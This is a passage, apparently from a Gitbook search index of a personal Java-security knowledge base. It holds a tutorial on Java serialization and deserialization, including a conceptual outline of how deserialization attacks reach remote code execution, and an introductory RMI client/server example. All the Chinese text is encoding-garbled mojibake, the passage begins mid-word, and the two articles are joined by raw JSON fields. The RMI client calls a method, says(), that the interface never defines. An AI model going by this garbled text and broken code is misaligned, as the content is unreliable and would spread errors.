è¾“åˆ°è¿œç¨‹ï¼Œè¿™æ ·ï¼Œå°±ç›¸å½“äºæŠŠJavaå¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶æˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“å‡ºå»äº†ã€‚ å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å‡ºæ¥ï¼Œå¹¶ä¸”å¯¹å®ƒè¿›è¡Œååºåˆ—åŒ–ï¼Œå³æŠŠä¸€ä¸ªäºŒè¿›åˆ¶å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯byte[]æ•°ç»„ï¼‰å˜å›Javaå¯¹è±¡ã€‚æœ‰äº†ååºåˆ—åŒ–ï¼Œä¿å­˜åˆ°æ–‡ä»¶ä¸­çš„byte[]æ•°ç»„åˆå¯ä»¥â€œå˜å›â€Javaå¯¹è±¡ï¼Œæˆ–è€…ä»ç½‘ç»œä¸Šè¯»å–byte[]å¹¶æŠŠå®ƒâ€œå˜å›â€Javaå¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€å¯¹è±¡çš„æ•°æ®ï¼Œè¿˜æœ‰å¯¹è±¡ä¸­çš„æ•°æ®ç±»å‹å¯ä»¥ç”¨æ¥åœ¨å†…å­˜ä¸­æ–°å»ºå¯¹è±¡ã€‚ æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯ Java è™šæ‹Ÿæœºï¼ˆJVMï¼‰ç‹¬ç«‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªå¹³å°ä¸Šåºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥åœ¨å¦ä¸€ä¸ªå®Œå…¨ä¸åŒçš„å¹³å°ä¸Šååºåˆ—åŒ–è¯¥å¯¹è±¡ã€‚ Javaçš„åºåˆ—åŒ–æœºåˆ¶ä»…é€‚ç”¨äºJavaï¼Œå¦‚æœéœ€è¦ä¸å…¶å®ƒè¯­è¨€äº¤æ¢æ•°æ®ï¼Œå¿…é¡»ä½¿ç”¨é€šç”¨çš„åºåˆ—åŒ–æ–¹æ³•ï¼Œä¾‹å¦‚JSONã€‚ åºåˆ—åŒ–è¦æ±‚ ä¸€ä¸ªJavaå¯¹è±¡è¦èƒ½åºåˆ—åŒ–ï¼Œå¿…é¡»å®ç°ä¸€ä¸ªç‰¹æ®Šçš„java.io.Serializableæ¥å£ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š public interface Serializable { } Serializableæ¥å£æ²¡æœ‰å®šä¹‰ä»»ä½•æ–¹æ³•ï¼Œå®ƒæ˜¯ä¸€ä¸ªç©ºæ¥å£ã€‚æˆ‘ä»¬æŠŠè¿™æ ·çš„ç©ºæ¥å£ç§°ä¸ºâ€œæ ‡è®°æ¥å£â€ï¼ˆMarker Interfaceï¼‰ï¼Œå®ç°äº†æ ‡è®°æ¥å£çš„ç±»ä»…ä»…æ˜¯ç»™è‡ªèº«è´´äº†ä¸ªâ€œæ ‡è®°â€ï¼Œå¹¶æ²¡æœ‰å¢åŠ ä»»ä½•æ–¹æ³•ã€‚ å…¶ä»– ç±» ObjectInputStream å’Œ ObjectOutputStream æ˜¯é«˜å±‚æ¬¡çš„æ•°æ®æµï¼Œå®ƒä»¬åŒ…å«ååºåˆ—åŒ–å’Œåºåˆ—åŒ–å¯¹è±¡çš„æ–¹æ³•ã€‚ ObjectOutputStream ç±»åŒ…å«å¾ˆå¤šå†™æ–¹æ³•æ¥å†™å„ç§æ•°æ®ç±»å‹ï¼Œä½†æ˜¯ä¸€ä¸ªç‰¹åˆ«çš„æ–¹æ³•ä¾‹å¤–ï¼š public final void writeObject(Object x) throws IOException ä¸Šé¢çš„æ–¹æ³•åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å®ƒå‘é€åˆ°è¾“å‡ºæµã€‚ç›¸ä¼¼çš„ ObjectInputStream ç±»åŒ…å«å¦‚ä¸‹ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼š public final Object readObject() throws IOException, ClassNotFoundException è¯¥æ–¹æ³•ä»æµä¸­å–å‡ºä¸‹ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡ååºåˆ—åŒ–ã€‚å®ƒçš„è¿”å›å€¼ä¸ºObjectï¼Œå› æ­¤ï¼Œä½ éœ€è¦å°†å®ƒè½¬æ¢æˆåˆé€‚çš„æ•°æ®ç±»å‹ã€‚ åºåˆ—åŒ–æ­¥éª¤ æŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ— æ­¥éª¤ä¸€ï¼šåˆ›å»ºä¸€ä¸ªObjectOutputStreamè¾“å‡ºæµï¼› æ­¥éª¤äºŒï¼šè°ƒç”¨ObjectOutputStreamå¯¹è±¡çš„writeObjectè¾“å‡ºå¯åºåˆ—åŒ–å¯¹è±¡ã€‚ ååºåˆ—åŒ–æ­¥éª¤ æŠŠå­—èŠ‚åºåˆ—è½¬æ¢ä¸ºå¯¹è±¡ æ­¥éª¤ä¸€ï¼šåˆ›å»ºä¸€ä¸ªObjectInputStreamè¾“å…¥æµï¼› æ­¥éª¤äºŒï¼šè°ƒç”¨ObjectInputStreamå¯¹è±¡çš„readObject()å¾—åˆ°åºåˆ—åŒ–çš„å¯¹è±¡ã€‚ ä»£ç ä¸¾ä¾‹ åºåˆ—åŒ–å’Œååºåˆ—åŒ– --> æ–‡ä»¶ package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // åºåˆ—åŒ– // åˆ›å»ºä¸€ä¸ªFileOutputStreamï¼Œä¸”å°†è¿™ä¸ªFileOutputStreamå°è£…åˆ°ObjectOutputStreamä¸­ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // è°ƒç”¨writeObjectæ–¹æ³•ï¼Œåºåˆ—åŒ–å¯¹è±¡åˆ°æ–‡ä»¶123.serä¸­ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // ååºåˆ—åŒ– // åˆ›å»ºä¸€ä¸ªFIleInutputStreamï¼Œå¹¶å°†FileInputStreamå°è£…åˆ°ObjectInputStreamä¸­ try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // è°ƒç”¨readObjectä»123.serä¸­ååºåˆ—åŒ–å‡ºå¯¹è±¡ï¼Œè¿˜éœ€è¦è¿›è¡Œä¸€ä¸‹ç±»å‹è½¬æ¢ï¼Œé»˜è®¤æ˜¯Objectç±»å‹ SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // å¿…é¡»è¦å®ç°Serializableè¿™ä¸ªæ¥å£ï¼Œå¯ä»¥ä¸ç”¨é‡Œé¢çš„æ–¹æ³• public int x; public int add(int a,int b){ return a+b+x; } } è¿™é‡Œè¦æ³¨æ„ä»¥ä¸‹è¦ç‚¹ï¼š readObject() æ–¹æ³•ä¸­çš„ try/catchä»£ç å—å°è¯•æ•è· ClassNotFoundException å¼‚å¸¸ã€‚å¯¹äº JVM å¯ä»¥ååºåˆ—åŒ–å¯¹è±¡ï¼Œå®ƒå¿…é¡»æ˜¯èƒ½å¤Ÿæ‰¾åˆ°å­—èŠ‚ç çš„ç±»ã€‚å¦‚æœJVMåœ¨ååºåˆ—åŒ–å¯¹è±¡çš„è¿‡ç¨‹ä¸­æ‰¾ä¸åˆ°è¯¥ç±»ï¼Œåˆ™æŠ›å‡ºä¸€ä¸ª ClassNotFoundException å¼‚å¸¸ã€‚ readObject() æ–¹æ³•çš„è¿”å›å€¼è¢«è½¬åŒ–æˆ SerializeDemoå¼•ç”¨ã€‚ åºåˆ—åŒ–å’Œååºåˆ—åŒ– --> bytesæ•°ç»„ package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // åºåˆ—åŒ– ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // æœ¬ä½“ ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // åªæ˜¯ä¸€ä¸ªè£…é¥°å™¨çš„ä½œç”¨ Filteræ¨¡å¼ï¼Œæ‡‚ï¼Ÿ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // ååºåˆ—åŒ– ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // å¿…é¡»è¦å®ç°Serializableè¿™ä¸ªæ¥å£ï¼Œå¯ä»¥ä¸ç”¨é‡Œé¢çš„æ–¹æ³• public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ åºåˆ—åŒ–ç‰¹å¾ åå…­è¿›åˆ¶æŸ¥çœ‹æˆ‘ä»¬ç”Ÿæˆçš„123.ser # hexdumpæ²¡æœ‰xxdç›´è§‚ xxd 123.ser xxdæ˜¾ç¤ºçš„ç»“æœï¼Œä¸­é—´é‚£ä¸€æ æ˜¯æ–‡ä»¶çš„åå…­è¿›åˆ¶æ˜¾ç¤ºï¼Œæœ€å³è¾¹æ˜¯å­—ç¬¦æ˜¾ç¤ºã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„ç‰¹å¾å€¼å°±æ˜¯16è¿›åˆ¶æ˜¾ç¤ºæ—¶çš„å‰32ä½ï¼š AC EDï¼šSTREAM_MAGICï¼Œå£°æ˜ä½¿ç”¨äº†åºåˆ—åŒ–åè®®ï¼Œä»è¿™é‡Œå¯ä»¥åˆ¤æ–­ä¿å­˜çš„å†…å®¹æ˜¯å¦ä¸ºåºåˆ—åŒ–æ•°æ®ã€‚ ï¼ˆè¿™æ˜¯åœ¨é»‘ç›’æŒ–æ˜ååºåˆ—åŒ–æ¼æ´å¾ˆé‡è¦çš„ä¸€ä¸ªç‚¹ï¼‰ 00 05ï¼šSTREAM_VERSIONï¼Œåºåˆ—åŒ–åè®®ç‰ˆæœ¬ã€‚ å®‰å…¨æ€§ å› ä¸ºJavaçš„åºåˆ—åŒ–æœºåˆ¶å¯ä»¥å¯¼è‡´ä¸€ä¸ªå®ä¾‹èƒ½ç›´æ¥ä»byte[]æ•°ç»„åˆ›å»ºï¼Œè€Œä¸ç»è¿‡æ„é€ æ–¹æ³•ï¼Œå› æ­¤ï¼Œå®ƒå­˜åœ¨ä¸€å®šçš„å®‰å…¨éšæ‚£ã€‚ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„byte[]æ•°ç»„è¢«ååºåˆ—åŒ–åå¯ä»¥æ‰§è¡Œç‰¹å®šçš„Javaä»£ç ï¼Œä»è€Œå¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚ å®é™…ä¸Šï¼ŒJavaæœ¬èº«æä¾›çš„åŸºäºå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶æ—¢å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¹Ÿå­˜åœ¨å…¼å®¹æ€§é—®é¢˜ã€‚æ›´å¥½çš„åºåˆ—åŒ–æ–¹æ³•æ˜¯é€šè¿‡JSONè¿™æ ·çš„é€šç”¨æ•°æ®ç»“æ„æ¥å®ç°ï¼Œåªè¾“å‡ºåŸºæœ¬ç±»å‹ï¼ˆåŒ…æ‹¬Stringï¼‰çš„å†…å®¹ï¼Œè€Œä¸å­˜å‚¨ä»»ä½•ä¸ä»£ç ç›¸å…³çš„ä¿¡æ¯ã€‚ ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»æµç¨‹ å®¢æˆ·ç«¯æ„é€ payload(æœ‰æ•ˆè½½è·)ï¼Œå¹¶è¿›è¡Œä¸€å±‚å±‚çš„å°è£…ï¼Œå®Œæˆæœ€åçš„expï¼ˆexploit-åˆ©ç”¨ä»£ç ï¼‰ expå‘é€åˆ°æœåŠ¡ç«¯ï¼Œè¿›å…¥ä¸€ä¸ªæœåŠ¡ç«¯è‡ªä¸»é‡å†™ï¼ˆä¹Ÿå¯èƒ½æ˜¯ä¹Ÿæœ‰ç»„ä»¶é‡å†™ï¼‰çš„readobjectå‡½æ•°ï¼Œå®ƒä¼šååºåˆ—åŒ–æ¢å¤æˆ‘ä»¬æ„é€ çš„expå»å½¢æˆä¸€ä¸ªæ¶æ„çš„æ•°æ®æ ¼å¼exp_1ï¼ˆå‰¥å»ç¬¬ä¸€å±‚ï¼‰ è¿™ä¸ªæ¶æ„æ•°æ®exp_1åœ¨æ¥ä¸‹æ¥çš„å¤„ç†æµç¨‹(å¯èƒ½æ˜¯åœ¨è‡ªä¸»é‡å†™çš„readobjectä¸­ã€ä¹Ÿå¯èƒ½æ˜¯åœ¨å¤–é¢çš„é€»è¾‘ä¸­)ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªexp_1è¿™ä¸ªæ¶æ„æ•°æ®ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨æ–¹æ³•ä¸­ä¼šæ ¹æ®exp_1çš„å†…å®¹è¿›è¡Œå‡½å¤„ç†ï¼Œä»è€Œä¸€å±‚å±‚åœ°å‰¥å»ï¼ˆæˆ–è€…è¯´å˜å½¢ã€è§£æï¼‰æˆ‘ä»¬exp_1å˜æˆexp_2ã€exp_3...... æœ€ååœ¨ä¸€ä¸ªå¯æ‰§è¡Œä»»æ„å‘½ä»¤çš„å‡½æ•°ä¸­æ‰§è¡Œæœ€åçš„payloadï¼Œå®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ é‚£ä¹ˆä»¥ä¸Šå¤§æ¦‚å¯ä»¥åˆ†æˆä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼š payloadï¼šéœ€è¦è®©æœåŠ¡ç«¯æ‰§è¡Œçš„è¯­å¥ï¼šæ¯”å¦‚è¯´å¼¹è®¡ç®—å™¨è¿˜æ˜¯æ‰§è¡Œè¿œç¨‹è®¿é—®ç­‰ï¼› ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼šæœåŠ¡ç«¯ä¸­å­˜åœ¨çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œä¼šä¸€å±‚å±‚æ‹¨å¼€æˆ‘ä»¬çš„expï¼Œæœ€åæ‰§è¡Œpayloadã€‚(å¦‚commons-collectionsåˆ©ç”¨é“¾) é‡å†™readObjectï¼šæœåŠ¡ç«¯ä¸­å­˜åœ¨çš„å¯ä»¥ä¸æˆ‘ä»¬æ¼æ´é“¾ç›¸æ¥çš„å¹¶ä¸”å¯ä»¥ä»å¤–éƒ¨è®¿é—®çš„readObjectå‡½æ•°é‡å†™ç‚¹ æ¼æ´æŒ–æ˜ javaæ˜¯æ”¯æŒè‡ªå®šä¹‰readObjectä¸writeObjectæ–¹æ³•çš„ï¼Œåªè¦æŸä¸ªç±»ä¸­æŒ‰ç…§ç‰¹å®šçš„è¦æ±‚å®ç°äº†readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒï¼Œå¦‚æœè¿™ä¸ªè‡ªå®šä¹‰çš„readObjectæ–¹æ³•é‡Œè¿›è¡Œäº†ä¸€äº›å±é™©æ“ä½œï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å‘ç”Ÿäº†ã€‚ ä¸¾ä¾‹å¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°è‡ªå®šä¹‰çš„readObjectçš„ç¡®æ‰§è¡Œäº†ï¼Œä¸è¿‡çœŸå®çš„åº”ç”¨ä¸­å±é™©æ“ä½œæ¯”è¾ƒéšè”½ã€‚ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/04.RMIåŸºç¡€.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/04.RMIåŸºç¡€.html","title":"04.RMIåŸºç¡€","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 RMIæ¦‚è¿° RMIå®ç°æœºåˆ¶ RMIå®ç°ä¸¾ä¾‹ å®ç°è¿‡ç¨‹ å®ç°ä¸¾ä¾‹ HelloInterface.java HelloImpl.java Server.java Client.java æ³¨æ„äº‹é¡¹ å‚è€ƒæ–‡ç«  RMIæ¦‚è¿° RMI: è¿œç¨‹æ–¹æ³•è°ƒç”¨(Remote Method Invocation)ï¼Œå®ƒæ”¯æŒå­˜å‚¨äºä¸åŒåœ°å€ç©ºé—´çš„ç¨‹åºçº§å¯¹è±¡ä¹‹é—´å½¼æ­¤è¿›è¡Œé€šä¿¡ï¼Œå®ç°è¿œç¨‹å¯¹è±¡ä¹‹é—´çš„æ— ç¼è¿œç¨‹è°ƒç”¨ã€‚ Java RMIï¼šç”¨äºä¸åŒè™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡ï¼Œè¿™äº›è™šæ‹Ÿæœºå¯ä»¥åœ¨ä¸åŒçš„ä¸»æœºä¸Šã€ä¹Ÿå¯ä»¥åœ¨åŒä¸€ä¸ªä¸»æœºä¸Šï¼›ä¸€ä¸ªè™šæ‹Ÿæœºä¸­çš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ªè™šæ‹Ÿæœºä¸­çš„å¯¹è±¡çš„æ–¹æ³•ï¼ˆä¸€ä¸ªJVMä¸­çš„ä»£ç å¯ä»¥é€šè¿‡ç½‘ç»œå®ç°è¿œç¨‹è°ƒç”¨å¦ä¸€ä¸ªJVMçš„æŸä¸ªæ–¹æ³•ã€‚ï¼‰ï¼Œåªä¸è¿‡æ˜¯å…è®¸è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡è¦é€šè¿‡ä¸€äº›æ ‡å¿—åŠ ä»¥æ ‡è¯†ã€‚ æä¾›æœåŠ¡çš„ä¸€æ–¹æˆ‘ä»¬ç§°ä¹‹ä¸ºæœåŠ¡å™¨ï¼Œè€Œå®ç°è¿œç¨‹è°ƒç”¨çš„ä¸€æ–¹æˆ‘ä»¬ç§°ä¹‹ä¸ºå®¢æˆ·ç«¯ã€‚ å…·ä½“å®ç°æ–¹æ³•ï¼š è¿œç¨‹æœåŠ¡å™¨æä¾›å…·ä½“çš„ç±»å’Œæ–¹æ³•ï¼Œæœ¬åœ°ä¼šé€šè¿‡æŸç§æ–¹å¼è·å¾—è¿œç¨‹ç±»çš„ä¸€ä¸ªä»£ç†ï¼Œç„¶åé€šè¿‡è¿™ä¸ªä»£ç†è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œæ–¹æ³•çš„å‚æ•°æ˜¯é€šè¿‡åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ–¹å¼ä¼ é€’çš„ï¼Œæ‰€ä»¥ï¼š åªè¦æœåŠ¡ç«¯çš„å¯¹è±¡æä¾›äº†ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectç±»å‹çš„å‚æ•°ï¼Œ ä¸”è¿œç¨‹æœåŠ¡å™¨çš„classpathä¸­å­˜åœ¨å¯åˆ©ç”¨popé“¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨å®¢æˆ·ç«¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¼ é€’ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„å¯¹è±¡çš„æ–¹å¼æ¥æ”»å‡»rmiæœåŠ¡ã€‚ RMIå®ç°æœºåˆ¶ è¦å®ç°RMIï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¿…é¡»å…±äº«åŒä¸€ä¸ªæ¥å£ã€‚Javaçš„RMIè§„å®šæ­¤æ¥å£å¿…é¡»æ´¾ç”Ÿè‡ªjava.rmi.Remoteï¼Œå¹¶åœ¨æ¯ä¸ªæ–¹æ³•å£°æ˜æŠ›å‡ºRemoteExceptionã€‚ ä¸Šé¢è¯´äº†æœ¬åœ°ä¼šé€šè¿‡æŸç§æ–¹å¼è·å¾—è¿œç¨‹å¯¹è±¡çš„ä»£ç†ï¼Œé‚£ä¹ˆå…·ä½“æ˜¯æ€ä¹ˆçš„å®ç°æœºåˆ¶å‘¢ï¼ŸRMIæ¨¡å¼ä¸­é™¤äº†æœ‰Clientä¸Serverï¼Œè¿˜å€ŸåŠ©äº†ä¸€ä¸ªRegistry(æ³¨å†Œä¸­å¿ƒ)ã€‚ å› æ­¤ï¼ŒRMIç”±3ä¸ªéƒ¨åˆ†æ„æˆ ç¬¬ä¸€ä¸ªæ˜¯rmiregistryï¼ˆJDKæä¾›çš„ä¸€ä¸ªå¯ä»¥ç‹¬ç«‹è¿è¡Œçš„ç¨‹åºï¼Œåœ¨binç›®å½•ä¸‹ï¼‰ ç¬¬äºŒä¸ªæ˜¯serverç«¯çš„ç¨‹åºï¼Œå¯¹å¤–æä¾›è¿œç¨‹å¯¹è±¡ ç¬¬ä¸‰ä¸ªæ˜¯clientç«¯çš„ç¨‹åºï¼Œæƒ³è¦è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ã€‚ Server Registry Client æä¾›å…·ä½“çš„è¿œç¨‹å¯¹è±¡ ä¸€ä¸ªæ³¨å†Œè¡¨ï¼Œå­˜æ”¾ç€è¿œç¨‹å¯¹è±¡çš„ä½ç½®ï¼ˆipã€ç«¯å£ã€æ ‡è¯†ç¬¦ï¼‰ è¿œç¨‹å¯¹è±¡çš„ä½¿ç”¨è€… å…¶ä¸­Serverä¸Registryå¯ä»¥åœ¨åŒä¸€æœåŠ¡å™¨ä¸Šå®ç°ï¼Œä¹Ÿå¯ä»¥å¸ƒç½®åœ¨ä¸åŒæœåŠ¡å™¨ä¸Šï¼Œç°åœ¨ä¸€ä¸ªå®Œæ•´çš„RMIæµç¨‹å¯ä»¥å¤§æ¦‚æè¿°ä¸ºï¼š å¯åŠ¨RegistryæœåŠ¡ï¼Œå¯åŠ¨æ—¶å¯ä»¥æŒ‡å®šæœåŠ¡ç›‘å¬çš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„ç«¯å£ï¼ˆ1099ï¼‰ã€‚ Serverç«¯åœ¨æœ¬åœ°å…ˆå®ä¾‹åŒ–ä¸€ä¸ªæä¾›æœåŠ¡çš„å®ç°ç±»ï¼Œç„¶åé€šè¿‡RMIæä¾›çš„ Naming/Context/Registryï¼ˆä¸‹é¢å®ä¾‹ç”¨çš„Registryï¼‰ç­‰ç±»çš„bindæˆ–rebindæ–¹æ³•å°†åˆšæ‰å®ä¾‹åŒ–å¥½çš„å®ç°ç±»æ³¨å†Œåˆ°RMI Registryä¸Šå¹¶å¯¹å¤–æš´éœ²ä¸€ä¸ªåç§°ã€‚ Clientç«¯é€šè¿‡æœ¬åœ°çš„æ¥å£å’Œä¸€ä¸ªå·²çŸ¥çš„åç§°ï¼ˆå³RMI Registryæš´éœ²å‡ºçš„åç§°ï¼‰å†ä½¿ç”¨RMIæä¾›çš„Naming/Context/Registryç­‰ç±»çš„lookupæ–¹æ³•ä»RMI Serveré‚£æ‹¿åˆ°å®ç°ç±»ã€‚è¿™æ ·è™½ç„¶æœ¬åœ°æ²¡æœ‰è¿™ä¸ªç±»çš„å®ç°ç±»ï¼Œä½†æ‰€æœ‰çš„æ–¹æ³•éƒ½åœ¨æ¥å£é‡Œäº†ï¼Œä¾¿å¯ä»¥å®ç°è¿œç¨‹è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•äº†ã€‚ RMIçš„äº¤äº’å›¾ï¼š PSï¼š å›¾ä¸­çš„stubå°±æ˜¯å®¢æˆ·ç«¯ä»£ç†ï¼Œskeletonå°±æ˜¯æœåŠ¡ç«¯ä»£ç† è¿œç¨‹æ–¹æ³•è°ƒç”¨çš„é€šä¿¡æ¨¡å¼ï¼š RMIå®ç°ä¸¾ä¾‹ å®ç°è¿‡ç¨‹ å¤§æ¦‚å®ç°è¿‡ç¨‹ å®šä¹‰è¿œç¨‹æ¥å£ æœåŠ¡ç«¯å®ç°è¿œç¨‹æ¥å£ æœåŠ¡ç«¯æ³¨å†Œè¿œç¨‹å¯¹è±¡ å®¢æˆ·ç«¯è°ƒç”¨æ¥å£ å®ç°ä¸¾ä¾‹ HelloInterface.java // å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£ package com.company; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { // åˆ›å»ºæ¥å£ï¼Œå¿…é¡»ç»§æ‰¿Remote String say (String name) throws RemoteException; // æ¯ä¸ªå‡½æ•°å¿…é¡»è¦æŠ›å‡º RemoteException å¼‚å¸¸ } HelloImpl.java // å®ç°è¿œç¨‹æ¥å£ package com.company; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; // å¿…é¡»è¦è¿™ä¸ªï¼Œä¸ç„¶ä¼šæŠ¥åºåˆ—åŒ–çš„é”™ public class HelloImpl extends UnicastRemoteObject implements HelloInterface { public HelloImpl() throws RemoteException { // å¿…é¡»è¦è¿™ä¸ª super(); } @Override public String say(String name) throws RemoteException { // å®ç°åˆšæ‰å®šä¹‰çš„æ¥å£çš„æ–¹æ³• return \"test \" + name; } } Server.java // åˆ›å»ºä¸€ä¸ªæ³¨å†Œè¡¨ï¼Œå¹¶æ³¨å†Œè¿œç¨‹å¯¹è±¡ package com.company; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; //æ³¨å†Œè¿œç¨‹å¯¹è±¡ public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException { HelloInterface helloService = new HelloImpl(); LocateRegistry.createRegistry(1099); // åˆ›å»º System.setProperty(\"java.rmi.server.hostname\",\"127.0.0.1\"); // ç»‘å®šIPï¼Œé»˜è®¤æ˜¯ 127.0.0.1 Registry registry = LocateRegistry.getRegistry(); // è·å–å®ä¾‹ registry.bind(\"test\",helloService); // æ³¨å†Œè¿œç¨‹å¯¹è±¡ //Naming.bind(\"test\",helloService); // ä¸Šé¢2è¡Œå¯ä»¥ç”¨è¿™ä¸ªæ›¿æ¢ } } Client.java // æŸ¥æ‰¾è¿œç¨‹è°ƒç”¨æ–¹æ³•ï¼Œå¹¶ä¸”è°ƒç”¨è¿œç¨‹æ–¹æ³• package com.company; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main( String[] args ) throws RemoteException, NotBoundException, MalformedURLException { // HelloInterface hello = (HelloInterface) Naming.lookup(\"rmi://127.0.0.1:1099/test\"); // å†™æ³•éƒ½å¯ Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); HelloInterface hello = (HelloInterface) registry.lookup(\"test\"); System.out.println(hello.says(\"123123\")); } } æ³¨æ„äº‹é¡¹ æ¥å£éœ€è¦ç»§æ‰¿Remoteæ¥å£ï¼Œä¸”æ–¹æ³•éœ€è¦æŠ›å‡ºRemoteExceptioné”™è¯¯ æ¥å£çš„å®ç°ç±»éœ€è¦ç»§æ‰¿UnicastRemoteObjectï¼ŒåŒæ ·çš„æ–¹æ³•éœ€è¦æŠ›å‡ºRemoteExceptioné”™è¯¯ å¦‚æœè¿œç¨‹æ–¹æ³•éœ€è¦ä¼ å‚ï¼Œéœ€è¦ä¿è¯å‚æ•°æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæˆ‘è¿™é‡Œä¼ å‚åªæ˜¯ä¼ äº†å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå¦‚æœä¼ å‚æ˜¯è‡ªå®šä¹‰çš„å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡éœ€è¦å®ç°Serilizableæ¥å£ 